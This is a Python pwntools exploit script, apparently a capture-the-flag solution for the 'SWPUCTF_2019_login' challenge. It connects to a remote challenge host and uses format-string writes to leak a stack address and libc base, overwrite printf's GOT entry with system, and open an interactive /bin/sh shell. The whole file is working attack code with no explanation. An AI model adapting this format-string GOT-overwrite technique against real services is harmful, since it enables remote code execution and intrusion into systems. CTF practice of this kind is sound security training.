from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('SWPUCTF_2019_login')
io = remote('node4.buuoj.cn', 26264)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('SWPUCTF_2019_login')
printf_got = elf.got['printf']

io.sendlineafter('Please input your name: \n', 'aaaa')

payload = b'%6$p'
io.sendlineafter('Please input your password: \n', payload)
io.recvuntil('This is the wrong password: ')
stack = int(io.recvn(10), 16)
log.success('stack: ' + hex(stack))

target = (stack - 8) & 0xff
payload = b'%' + str.encode(str(target)) + b'c%6$hhn'
io.sendlineafter('Try again!\n', payload)

target = printf_got & 0xffff
payload = b'%' + str.encode(str(target)) + b'c%10$hn'
io.sendlineafter('Try again!\n', payload)

payload = b'%8$s'
io.sendlineafter('Try again!\n', payload)
io.recvuntil('This is the wrong password: ')
libc_base = u32(io.recvn(4)) - libc.sym['printf']
log.success('libc_base: ' + hex(libc_base))

target = (stack - 4) & 0xff
payload = b'%' + str.encode(str(target)) + b'c%6$hhn'
io.sendlineafter('Try again!\n', payload)

target = (printf_got & 0xff) + 1
payload = b'%' + str.encode(str(target)) + b'c%10$hhn'
io.sendlineafter('Try again!\n', payload)

system = libc_base + libc.sym['system']
target1, target2 = system & 0xff, (system >> 8) & 0xffff
payload = b'%' + str.encode(str(target1)) + b'c%8$hhn' 
payload += b'%' + str.encode(str(target2 - target1)) + b'c%9$hn'
io.sendlineafter('Try again!\n', payload)
io.sendafter('Try again!\n', '/bin/sh\x00')
io.interactive()

# gdb.attach(io)
# pause()
